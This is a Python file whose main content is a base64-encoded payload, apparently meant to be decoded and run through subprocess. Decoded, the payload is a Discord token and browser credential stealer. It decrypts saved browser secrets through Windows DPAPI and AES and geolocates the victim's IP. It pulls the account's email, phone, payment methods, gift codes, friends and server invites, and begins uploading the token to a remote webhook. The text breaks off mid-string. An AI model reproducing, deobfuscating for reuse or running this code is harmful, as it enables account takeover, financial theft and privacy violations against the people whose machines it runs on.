# -*- coding: utf-8 -*-


import base64
import subprocess
import tempfile


cz = "aW1wb3J0IG9zDQppbXBvcnQgcmUNCmltcG9ydCB0aW1lDQppbXBvcnQgc2h1dGlsDQppbXBvcnQgcmFuZG9tDQppbXBvcnQgdGhyZWFkaW5nDQppbXBvcnQgc3VicHJvY2Vzcw0KZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUNCmZyb20gYmFzZTY0IGltcG9ydCBiNjRkZWNvZGUNCmZyb20ganNvbiBpbXBvcnQgbG9hZHMsIGR1bXBzDQpmcm9tIHppcGZpbGUgaW1wb3J0IFppcEZpbGUsIFpJUF9ERUZMQVRFRA0KZnJvbSBzcWxpdGUzIGltcG9ydCBjb25uZWN0IGFzIHNxbF9jb25uZWN0DQpmcm9tIGpzb24gaW1wb3J0IGxvYWRzIGFzIGpzb25fbG9hZHMsIGxvYWQNCmZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IFJlcXVlc3QsIHVybG9wZW4NCmZyb20gY3R5cGVzIGltcG9ydCB3aW5kbGwsIHdpbnR5cGVzLCBieXJlZiwgY2RsbCwgU3RydWN0dXJlLCBQT0lOVEVSLCBjX2NoYXIsIGNfYnVmZmVyDQpyZXF1aXJlbWVudHMgPSBbDQogICAgWyJDcnlwdG8uQ2lwaGVyIiwgInB5Y3J5cHRvZG9tZSJdDQpdDQpmb3IgbW9kbCBpbiByZXF1aXJlbWVudHM6DQogICAgdHJ5OiANCiAgICAgICAgX19pbXBvcnRfXyhtb2RsWzBdKQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgc3VicHJvY2Vzcy5Qb3BlbihmIntleGVjdXRhYmxlfSAtbSBwaXAgaW5zdGFsbCB7bW9kbFsxXX0gLS1xdWlldCIsIHNoZWxsPVRydWUpDQogICAgICAgIHRpbWUuc2xlZXAoMykNCg0KZnJvbSBDcnlwdG8uQ2lwaGVyIGltcG9ydCBBRVMNCg0KY2xhc3MgREFUQV9CTE9CKFN0cnVjdHVyZSk6DQogICAgX2ZpZWxkc18gPSBbDQogICAgICAgICgnY2JEYXRhJywgd2ludHlwZXMuRFdPUkQpLA0KICAgICAgICAoJ3BiRGF0YScsIFBPSU5URVIoY19jaGFyKSkNCiAgICBdDQoNCmRlZiBnZXRpcCgpOg0KICAgIHRyeTpyZXR1cm4gdXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2FwaS5pcGlmeS5vcmciKSkucmVhZCgpLmRlY29kZSgpLnN0cmlwKCkNCiAgICBleGNlcHQ6cmV0dXJuICJOb25lIg0KDQpkZWYgemlwZm9sZGVyKGZvbGRlcm5hbWUsIHRhcmdldF9kaXIpOiAgICAgICAgICAgIA0KICAgIHppcG9iaiA9IFppcEZpbGUodGVtcCsiLyIrZm9sZGVybmFtZSArICcuemlwJywgJ3cnLCBaSVBfREVGTEFURUQpICMgaHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMTA0ODA0NDAvemlwLWZvbGRlci13aXRoLXN1YmZvbGRlci1pbi1weXRob24NCiAgICByb290bGVuID0gbGVuKHRhcmdldF9kaXIpICsgMQ0KICAgIGZvciBiYXNlLCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKHRhcmdldF9kaXIpOg0KICAgICAgICBmb3IgZmlsZSBpbiBmaWxlczoNCiAgICAgICAgICAgIGZuID0gb3MucGF0aC5qb2luKGJhc2UsIGZpbGUpDQogICAgICAgICAgICB6aXBvYmoud3JpdGUoZm4sIGZuW3Jvb3RsZW46XSkNCg0KZGVmIEdldERhdGEoYmxvYl9vdXQpOg0KICAgIGNiRGF0YSA9IGludChibG9iX291dC5jYkRhdGEpDQogICAgcGJEYXRhID0gYmxvYl9vdXQucGJEYXRhDQogICAgYnVmZmVyID0gY19idWZmZXIoY2JEYXRhKQ0KICAgIGNkbGwubXN2Y3J0Lm1lbWNweShidWZmZXIsIHBiRGF0YSwgY2JEYXRhKQ0KICAgIHdpbmRsbC5rZXJuZWwzMi5Mb2NhbEZyZWUocGJEYXRhKQ0KICAgIHJldHVybiBidWZmZXIucmF3DQoNCmRlZiBDcnlwdFVucHJvdGVjdERhdGEoZW5jcnlwdGVkX2J5dGVzLCBlbnRyb3B5PWInJyk6DQogICAgYnVmZmVyX2luID0gY19idWZmZXIoZW5jcnlwdGVkX2J5dGVzLCBsZW4oZW5jcnlwdGVkX2J5dGVzKSkNCiAgICBidWZmZXJfZW50cm9weSA9IGNfYnVmZmVyKGVudHJvcHksIGxlbihlbnRyb3B5KSkNCiAgICBibG9iX2luID0gREFUQV9CTE9CKGxlbihlbmNyeXB0ZWRfYnl0ZXMpLCBidWZmZXJfaW4pDQogICAgYmxvYl9lbnRyb3B5ID0gREFUQV9CTE9CKGxlbihlbnRyb3B5KSwgYnVmZmVyX2VudHJvcHkpDQogICAgYmxvYl9vdXQgPSBEQVRBX0JMT0IoKQ0KDQogICAgaWYgd2luZGxsLmNyeXB0MzIuQ3J5cHRVbnByb3RlY3REYXRhKGJ5cmVmKGJsb2JfaW4pLCBOb25lLCBieXJlZihibG9iX2VudHJvcHkpLCBOb25lLCBOb25lLCAweDAxLCBieXJlZihibG9iX291dCkpOg0KICAgICAgICByZXR1cm4gR2V0RGF0YShibG9iX291dCkNCg0KZGVmIERlY3J5cHRWYWx1ZShidWZmLCBtYXN0ZXJfa2V5PU5vbmUpOg0KICAgICAgICBzdGFydHMgPSBidWZmLmRlY29kZShlbmNvZGluZz0ndXRmOCcsIGVycm9ycz0naWdub3JlJylbOjNdDQogICAgICAgIGlmIHN0YXJ0cyA9PSAndjEwJyBvciBzdGFydHMgPT0gJ3YxMSc6DQogICAgICAgICAgICBpdiA9IGJ1ZmZbMzoxNV0NCiAgICAgICAgICAgIHBheWxvYWQgPSBidWZmWzE1Ol0NCiAgICAgICAgICAgIGNpcGhlciA9IEFFUy5uZXcobWFzdGVyX2tleSwgQUVTLk1PREVfR0NNLCBpdikNCiAgICAgICAgICAgIGRlY3J5cHRlZF9wYXNzID0gY2lwaGVyLmRlY3J5cHQocGF5bG9hZCkNCiAgICAgICAgICAgIGRlY3J5cHRlZF9wYXNzID0gZGVjcnlwdGVkX3Bhc3NbOi0xNl0NCiAgICAgICAgICAgIHRyeTogZGVjcnlwdGVkX3Bhc3MgPSBkZWNyeXB0ZWRfcGFzcy5kZWNvZGUoKQ0KICAgICAgICAgICAgZXhjZXB0OnBhc3MNCiAgICAgICAgICAgIHJldHVybiBkZWNyeXB0ZWRfcGFzcw0KDQpkZWYgTG9hZFVybGliKGhvb2ssIGRhdGE9JycsIGhlYWRlcnM9JycpOg0KICAgIGZvciBpIGluIHJhbmdlKDgpOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBpZiBoZWFkZXJzICE9ICcnOg0KICAgICAgICAgICAgICAgIHIgPSB1cmxvcGVuKFJlcXVlc3QoaG9vaywgZGF0YT1kYXRhLCBoZWFkZXJzPWhlYWRlcnMpKQ0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICByID0gdXJsb3BlbihSZXF1ZXN0KGhvb2ssIGRhdGE9ZGF0YSkpDQogICAgICAgICAgICByZXR1cm4gcg0KICAgICAgICBleGNlcHQ6IA0KICAgICAgICAgICAgcGFzcw0KDQpkZWYgZ2xvYmFsSW5mbygpOg0KICAgIHRyeToNCiAgICAgICAgdXNlcm5hbWUgPSBvcy5nZXRlbnYoIlVTRVJOQU1FIikNCiAgICAgICAgaXBkYXRhbm9qc29uID0gdXJsb3BlbihSZXF1ZXN0KGYiaHR0cHM6Ly9nZW9sb2NhdGlvbi1kYi5jb20vanNvbnAve0lQfSIpKS5yZWFkKCkuZGVjb2RlKCkucmVwbGFjZSgnY2FsbGJhY2soJywgJycpLnJlcGxhY2UoJ30pJywgJ30nKQ0KICAgICAgICBpcGRhdGEgPSBsb2FkcyhpcGRhdGFub2pzb24pDQogICAgICAgIGNvbnRyeSA9IGlwZGF0YVsiY291bnRyeV9uYW1lIl0NCiAgICAgICAgY29udHJ5Q29kZSA9IGlwZGF0YVsiY291bnRyeV9jb2RlIl0ubG93ZXIoKQ0KICAgICAgICBpZiBjb250cnlDb2RlID09ICJub3QgZm91bmQiOg0KICAgICAgICAgICAgZ2xvYmFsaW5mbyA9IGYiOnJhaW5ib3dfZmxhZzogIC0gYHt1c2VybmFtZS51cHBlcigpfSB8IHtJUH0gKHtjb250cnl9KWAiDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBnbG9iYWxpbmZvID0gZiI6ZmxhZ197Y29udHJ5Q29kZX06ICAtIGB7dXNlcm5hbWUudXBwZXIoKX0gfCB7SVB9ICh7Y29udHJ5fSlgIg0KICAgICAgICByZXR1cm4gZ2xvYmFsaW5mbw0KDQogICAgZXhjZXB0Og0KICAgICAgICByZXR1cm4gZiI6cmFpbmJvd19mbGFnOiAgLSBge3VzZXJuYW1lLnVwcGVyKCl9YCINCg0KZGVmIFRydXN0KENvb2tpZXMpOg0KICAgICMgc2ltcGxlIFRydXN0IEZhY3RvciBzeXN0ZW0NCiAgICBnbG9iYWwgREVURUNURUQNCiAgICBkYXRhID0gc3RyKENvb2tpZXMpDQogICAgdGltID0gcmUuZmluZGFsbCgiLmdvb2dsZS5jb20iLCBkYXRhKQ0KICAgIERFVEVDVEVEID0gVHJ1ZSBpZiBsZW4odGltKSA8IC0xIGVsc2UgRmFsc2UNCiAgICByZXR1cm4gREVURUNURUQNCg0KZGVmIGdldENvZGVzKHRva2VuKToNCiAgICB0cnk6DQogICAgICAgIGNvZGVzID0gIiINCiAgICAgICAgaGVhZGVycyA9IHsiQXV0aG9yaXphdGlvbiI6IHRva2VuLCJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAifQ0KICAgICAgICBjb2Rlc3MgPSBsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3VzZXJzL0BtZS9vdXRib3VuZC1wcm9tb3Rpb25zL2NvZGVzP2xvY2FsZT1lbi1HQiIsIGhlYWRlcnM9aGVhZGVycykpLnJlYWQoKS5kZWNvZGUoKSkNCiAgICAgICAgZm9yIGNvZGUgaW4gY29kZXNzOg0KICAgICAgICAgICAgdHJ5OmNvZGVzICs9IGYiOnRpY2tldHM6ICoqe3N0cihjb2RlWydwcm9tb3Rpb24nXVsnb3V0Ym91bmRfdGl0bGUnXSl9Kipcbjw6UmlnaHRkb3duOjg5MTM1NTY0NjQ3NjI5NjI3Mj4gYHtzdHIoY29kZVsnY29kZSddKX1gXG4iDQogICAgICAgICAgICBleGNlcHQ6cGFzcw0KICAgICAgICByZXR1cm4gY29kZXMNCiAgICBleGNlcHQ6cmV0dXJuICIiDQoNCmRlZiBHZXRCaWxsaW5nKHRva2VuKToNCiAgICBoZWFkZXJzID0gew0KICAgICAgICAiQXV0aG9yaXphdGlvbiI6IHRva2VuLA0KICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLA0KICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCINCiAgICB9DQogICAgdHJ5Og0KICAgICAgICBiaWxsaW5nanNvbiA9IGxvYWRzKHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdXNlcnMvQG1lL2JpbGxpbmcvcGF5bWVudC1zb3VyY2VzIiwgaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcmV0dXJuIEZhbHNlDQoNCiAgICBpZiBiaWxsaW5nanNvbiA9PSBbXTogcmV0dXJuICIgLSINCg0KICAgIGJpbGxpbmcgPSAiIg0KICAgIGZvciBtZXRob2RlIGluIGJpbGxpbmdqc29uOg0KICAgICAgICBpZiBtZXRob2RlWyJpbnZhbGlkIl0gPT0gRmFsc2U6DQogICAgICAgICAgICBpZiBtZXRob2RlWyJ0eXBlIl0gPT0gMToNCiAgICAgICAgICAgICAgICBiaWxsaW5nICs9ICI6Y3JlZGl0X2NhcmQ6Ig0KICAgICAgICAgICAgZWxpZiBtZXRob2RlWyJ0eXBlIl0gPT0gMjoNCiAgICAgICAgICAgICAgICBiaWxsaW5nICs9ICI6cGFya2luZzogIg0KDQogICAgcmV0dXJuIGJpbGxpbmcNCg0KZGVmIEdldEJhZGdlKGZsYWdzKToNCiAgICBpZiBmbGFncyA9PSAwOiByZXR1cm4gJycNCg0KICAgIE93bmVkQmFkZ2VzID0gJycNCiAgICBiYWRnZUxpc3QgPSAgWw0KICAgICAgICB7Ik5hbWUiOiAnQWN0aXZlX0RldmVsb3BlcicsICAgICAgICAgICAgICAgICdWYWx1ZSc6IDQxOTQzMDQsICAgJ0Vtb2ppJzogJzw6YWN0aXZlOjEwNDUyODMxMzI3OTYwNjM3OTQ+ICd9LA0KICAgICAgICB7Ik5hbWUiOiAnRWFybHlfVmVyaWZpZWRfQm90X0RldmVsb3BlcicsICAgICdWYWx1ZSc6IDEzMTA3MiwgICAgJ0Vtb2ppJzogIjw6ZGV2ZWxvcGVyOjg3NDc1MDgwODQ3MjgyNTk4Nj4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdCdWdfSHVudGVyX0xldmVsXzInLCAgICAgICAgICAgICAgJ1ZhbHVlJzogMTYzODQsICAgICAnRW1vamknOiAiPDpidWdodW50ZXJfMjo4NzQ3NTA4MDg0MzA4NzQ2NjQ+ICJ9LA0KICAgICAgICB7Ik5hbWUiOiAnRWFybHlfU3VwcG9ydGVyJywgICAgICAgICAgICAgICAgICdWYWx1ZSc6IDUxMiwgICAgICAgJ0Vtb2ppJzogIjw6ZWFybHlfc3VwcG9ydGVyOjg3NDc1MDgwODQxNDExMzgyMz4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CYWxhbmNlJywgICAgICAgICAgICAgICAgICAgJ1ZhbHVlJzogMjU2LCAgICAgICAnRW1vamknOiAiPDpiYWxhbmNlOjg3NDc1MDgwODI2NzI5MjY4Mz4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CcmlsbGlhbmNlJywgICAgICAgICAgICAgICAgJ1ZhbHVlJzogMTI4LCAgICAgICAnRW1vamknOiAiPDpicmlsbGlhbmNlOjg3NDc1MDgwODMzODYwODE5OT4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CcmF2ZXJ5JywgICAgICAgICAgICAgICAgICAgJ1ZhbHVlJzogNjQsICAgICAgICAnRW1vamknOiAiPDpicmF2ZXJ5Ojg3NDc1MDgwODM4ODk1MjA3NT4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdCdWdfSHVudGVyX0xldmVsXzEnLCAgICAgICAgICAgICAgJ1ZhbHVlJzogOCwgICAgICAgICAnRW1vamknOiAiPDpidWdodW50ZXJfMTo4NzQ3NTA4MDg0MjY2OTI2NTg+ICJ9LA0KICAgICAgICB7Ik5hbWUiOiAnSHlwZVNxdWFkX0V2ZW50cycsICAgICAgICAgICAgICAgICdWYWx1ZSc6IDQsICAgICAgICAgJ0Vtb2ppJzogIjw6aHlwZXNxdWFkX2V2ZW50czo4NzQ3NTA4MDg1OTQ0NzcwNTY+ICJ9LA0KICAgICAgICB7Ik5hbWUiOiAnUGFydG5lcmVkX1NlcnZlcl9Pd25lcicsICAgICAgICAgICdWYWx1ZSc6IDIsICAgICAgICAgJ0Vtb2ppJzogIjw6cGFydG5lcjo4NzQ3NTA4MDg2NzgzNTQ5NjQ+ICJ9LA0KICAgICAgICB7Ik5hbWUiOiAnRGlzY29yZF9FbXBsb3llZScsICAgICAgICAgICAgICAgICdWYWx1ZSc6IDEsICAgICAgICAgJ0Vtb2ppJzogIjw6c3RhZmY6ODc0NzUwODA4NzI4NjY2MTUyPiAifQ0KICAgIF0NCg0KICAgIGZvciBiYWRnZSBpbiBiYWRnZUxpc3Q6DQogICAgICAgIGlmIGZsYWdzIC8vIGJhZGdlWyJWYWx1ZSJdICE9IDA6DQogICAgICAgICAgICBPd25lZEJhZGdlcyArPSBiYWRnZVsiRW1vamkiXQ0KICAgICAgICAgICAgZmxhZ3MgPSBmbGFncyAlIGJhZGdlWyJWYWx1ZSJdDQoNCiAgICByZXR1cm4gT3duZWRCYWRnZXMNCg0KZGVmIEdldFVIUUZyaWVuZHModG9rZW4pOg0KICAgIGJhZGdlTGlzdCA9ICBbDQogICAgICAgIHsiTmFtZSI6ICdBY3RpdmVfRGV2ZWxvcGVyJywgICAgICAgICAgICAgICAgJ1ZhbHVlJzogNDE5NDMwNCwgICAnRW1vamknOiAnPDphY3RpdmU6MTA0NTI4MzEzMjc5NjA2Mzc5ND4gJ30sDQogICAgICAgIHsiTmFtZSI6ICdFYXJseV9WZXJpZmllZF9Cb3RfRGV2ZWxvcGVyJywgICAgJ1ZhbHVlJzogMTMxMDcyLCAgICAnRW1vamknOiAiPDpkZXZlbG9wZXI6ODc0NzUwODA4NDcyODI1OTg2PiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMicsICAgICAgICAgICAgICAnVmFsdWUnOiAxNjM4NCwgICAgICdFbW9qaSc6ICI8OmJ1Z2h1bnRlcl8yOjg3NDc1MDgwODQzMDg3NDY2ND4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdFYXJseV9TdXBwb3J0ZXInLCAgICAgICAgICAgICAgICAgJ1ZhbHVlJzogNTEyLCAgICAgICAnRW1vamknOiAiPDplYXJseV9zdXBwb3J0ZXI6ODc0NzUwODA4NDE0MTEzODIzPiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JhbGFuY2UnLCAgICAgICAgICAgICAgICAgICAnVmFsdWUnOiAyNTYsICAgICAgICdFbW9qaSc6ICI8OmJhbGFuY2U6ODc0NzUwODA4MjY3MjkyNjgzPiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyaWxsaWFuY2UnLCAgICAgICAgICAgICAgICAnVmFsdWUnOiAxMjgsICAgICAgICdFbW9qaSc6ICI8OmJyaWxsaWFuY2U6ODc0NzUwODA4MzM4NjA4MTk5PiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyYXZlcnknLCAgICAgICAgICAgICAgICAgICAnVmFsdWUnOiA2NCwgICAgICAgICdFbW9qaSc6ICI8OmJyYXZlcnk6ODc0NzUwODA4Mzg4OTUyMDc1PiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMScsICAgICAgICAgICAgICAnVmFsdWUnOiA4LCAgICAgICAgICdFbW9qaSc6ICI8OmJ1Z2h1bnRlcl8xOjg3NDc1MDgwODQyNjY5MjY1OD4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdIeXBlU3F1YWRfRXZlbnRzJywgICAgICAgICAgICAgICAgJ1ZhbHVlJzogNCwgICAgICAgICAnRW1vamknOiAiPDpoeXBlc3F1YWRfZXZlbnRzOjg3NDc1MDgwODU5NDQ3NzA1Nj4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdQYXJ0bmVyZWRfU2VydmVyX093bmVyJywgICAgICAgICAgJ1ZhbHVlJzogMiwgICAgICAgICAnRW1vamknOiAiPDpwYXJ0bmVyOjg3NDc1MDgwODY3ODM1NDk2ND4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdEaXNjb3JkX0VtcGxveWVlJywgICAgICAgICAgICAgICAgJ1ZhbHVlJzogMSwgICAgICAgICAnRW1vamknOiAiPDpzdGFmZjo4NzQ3NTA4MDg3Mjg2NjYxNTI+ICJ9DQogICAgXQ0KICAgIGhlYWRlcnMgPSB7DQogICAgICAgICJBdXRob3JpemF0aW9uIjogdG9rZW4sDQogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsDQogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIg0KICAgIH0NCiAgICB0cnk6DQogICAgICAgIGZyaWVuZGxpc3QgPSBsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y2L3VzZXJzL0BtZS9yZWxhdGlvbnNoaXBzIiwgaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcmV0dXJuIEZhbHNlDQoNCiAgICB1aHFsaXN0ID0gJycNCiAgICBmb3IgZnJpZW5kIGluIGZyaWVuZGxpc3Q6DQogICAgICAgIE93bmVkQmFkZ2VzID0gJycNCiAgICAgICAgZmxhZ3MgPSBmcmllbmRbJ3VzZXInXVsncHVibGljX2ZsYWdzJ10NCiAgICAgICAgZm9yIGJhZGdlIGluIGJhZGdlTGlzdDoNCiAgICAgICAgICAgIGlmIGZsYWdzIC8vIGJhZGdlWyJWYWx1ZSJdICE9IDAgYW5kIGZyaWVuZFsndHlwZSddID09IDE6DQogICAgICAgICAgICAgICAgaWYgbm90ICJIb3VzZSIgaW4gYmFkZ2VbIk5hbWUiXSBhbmQgbm90IGJhZGdlWyJOYW1lIl0gPT0gIkFjdGl2ZV9EZXZlbG9wZXIiOg0KICAgICAgICAgICAgICAgICAgICBPd25lZEJhZGdlcyArPSBiYWRnZVsiRW1vamkiXQ0KICAgICAgICAgICAgICAgIGZsYWdzID0gZmxhZ3MgJSBiYWRnZVsiVmFsdWUiXQ0KICAgICAgICBpZiBPd25lZEJhZGdlcyAhPSAnJzoNCiAgICAgICAgICAgIHVocWxpc3QgKz0gZiJ7T3duZWRCYWRnZXN9IHwgKip7ZnJpZW5kWyd1c2VyJ11bJ3VzZXJuYW1lJ119I3tmcmllbmRbJ3VzZXInXVsnZGlzY3JpbWluYXRvciddfSoqIGAoe2ZyaWVuZFsndXNlciddWydpZCddfSlgXG4iDQogICAgcmV0dXJuIHVocWxpc3QgaWYgdWhxbGlzdCAhPSAnJyBlbHNlICJgTm8gSFEgRnJpZW5kc2AiDQoNCmRlZiBHZXRVSFFHdWlsZHModG9rZW4pOg0KICAgIHRyeToNCiAgICAgICAgdWhxZ3VpbGRzID0gIiINCiAgICAgICAgaGVhZGVycyA9IHsNCiAgICAgICAgICAgICJBdXRob3JpemF0aW9uIjogdG9rZW4sDQogICAgICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLA0KICAgICAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiDQogICAgICAgIH0NCiAgICAgICAgZ3VpbGRzID0gbG9hZHModXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS91c2Vycy9AbWUvZ3VpbGRzP3dpdGhfY291bnRzPXRydWUiLCBoZWFkZXJzPWhlYWRlcnMpKS5yZWFkKCkuZGVjb2RlKCkpDQogICAgICAgIGZvciBndWlsZCBpbiBndWlsZHM6DQogICAgICAgICAgICBpZiBndWlsZFsiYXBwcm94aW1hdGVfbWVtYmVyX2NvdW50Il0gPCA1MDogY29udGludWUNCiAgICAgICAgICAgIGlmIGd1aWxkWyJvd25lciJdIG9yIGd1aWxkWyJwZXJtaXNzaW9ucyJdID09ICI0Mzk4MDQ2NTExMTAzIjoNCiAgICAgICAgICAgICAgICBpbnYgPSBsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoZiJodHRwczovL2Rpc2NvcmQuY29tL2FwaS92Ni9ndWlsZHMve2d1aWxkWydpZCddfS9pbnZpdGVzIiwgaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKSAgICANCiAgICAgICAgICAgICAgICB0cnk6ICAgIGNjID0gImh0dHBzOi8vZGlzY29yZC5nZy8iK3N0cihpbnZbMF1bJ2NvZGUnXSkNCiAgICAgICAgICAgICAgICBleGNlcHQ6IGNjID0gRmFsc2UNCiAgICAgICAgICAgICAgICB1aHFndWlsZHMgKz0gZiI8OklfSm9pbjo5MjgzMDIwOTgyODQ2OTE1MjY+IFt7Z3VpbGRbJ25hbWUnXX1dKHtjY30pIGAoe2d1aWxkWydpZCddfSlgICoqe3N0cihndWlsZFsnYXBwcm94aW1hdGVfbWVtYmVyX2NvdW50J10pfSBNZW1iZXJzKipcbiINCiAgICAgICAgaWYgdWhxZ3VpbGRzID09ICIiOiByZXR1cm4gImBObyBIUSBHdWlsZHNgIg0KICAgICAgICByZXR1cm4gdWhxZ3VpbGRzDQogICAgZXhjZXB0Og0KICAgICAgICByZXR1cm4gImBObyBIUSBHdWlsZHNgIg0KDQpkZWYgR2V0VG9rZW5JbmZvKHRva2VuKToNCiAgICBoZWFkZXJzID0gew0KICAgICAgICAiQXV0aG9yaXphdGlvbiI6IHRva2VuLA0KICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLA0KICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCINCiAgICB9DQoNCiAgICB1c2VyanNvbiA9IGxvYWRzKHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1lIiwgaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKQ0KICAgIHVzZXJuYW1lID0gdXNlcmpzb25bInVzZXJuYW1lIl0NCiAgICBoYXNodGFnID0gdXNlcmpzb25bImRpc2NyaW1pbmF0b3IiXQ0KICAgIGVtYWlsID0gdXNlcmpzb25bImVtYWlsIl0NCiAgICBpZGQgPSB1c2VyanNvblsiaWQiXQ0KICAgIHBmcCA9IHVzZXJqc29uWyJhdmF0YXIiXQ0KICAgIGZsYWdzID0gdXNlcmpzb25bInB1YmxpY19mbGFncyJdDQogICAgbml0cm8gPSAiIg0KICAgIHBob25lID0gIi0iDQoNCiAgICBpZiAicHJlbWl1bV90eXBlIiBpbiB1c2VyanNvbjoNCiAgICAgICAgbml0cm90ID0gdXNlcmpzb25bInByZW1pdW1fdHlwZSJdDQogICAgICAgIGlmIG5pdHJvdCA9PSAxOg0KICAgICAgICAgICAgbml0cm8gPSAiPDpjbGFzc2ljOjg5NjExOTE3MTAxOTA2NzQyMz4gIg0KICAgICAgICBlbGlmIG5pdHJvdCA9PSAyOg0KICAgICAgICAgICAgbml0cm8gPSAiPGE6Ym9vc3Q6ODI0MDM2Nzc4NTcwNDE2MTI5PiA8OmNsYXNzaWM6ODk2MTE5MTcxMDE5MDY3NDIzPiAiDQogICAgaWYgInBob25lIiBpbiB1c2VyanNvbjogcGhvbmUgPSBmJ2B7dXNlcmpzb25bInBob25lIl19YCcgaWYgdXNlcmpzb25bInBob25lIl0gIT0gTm9uZSBlbHNlICItIg0KDQogICAgcmV0dXJuIHVzZXJuYW1lLCBoYXNodGFnLCBlbWFpbCwgaWRkLCBwZnAsIGZsYWdzLCBuaXRybywgcGhvbmUNCg0KZGVmIGNoZWNrVG9rZW4odG9rZW4pOg0KICAgIGhlYWRlcnMgPSB7DQogICAgICAgICJBdXRob3JpemF0aW9uIjogdG9rZW4sDQogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsDQogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIg0KICAgIH0NCiAgICB0cnk6DQogICAgICAgIHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1lIiwgaGVhZGVycz1oZWFkZXJzKSkNCiAgICAgICAgcmV0dXJuIFRydWUNCiAgICBleGNlcHQ6DQogICAgICAgIHJldHVybiBGYWxzZQ0KDQpkZWYgVHJpbShvYmopOg0KICAgIGlmIGxlbihvYmopID4gMTAwMDogDQogICAgICAgIGYgPSBvYmouc3BsaXQoIlxuIikNCiAgICAgICAgb2JqID0gIiINCiAgICAgICAgZm9yIGkgaW4gZjoNCiAgICAgICAgICAgIGlmIGxlbihvYmopKyBsZW4oaSkgPj0gMTAwMDogDQogICAgICAgICAgICAgICAgb2JqICs9ICIuLi4iDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIG9iaiArPSBpICsgIlxuIg0KICAgIHJldHVybiBvYmoNCg0KZGVmIHVwbG9hZFRva2VuKHRva2VuLCBwYXRoKToNCiAgICBnbG9iYWwgaG9vaw0KICAgIGhlYWRlcnMgPSB7DQogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsDQogICAgICAgICJVc2VyLUFnZW50IjogIk1vemls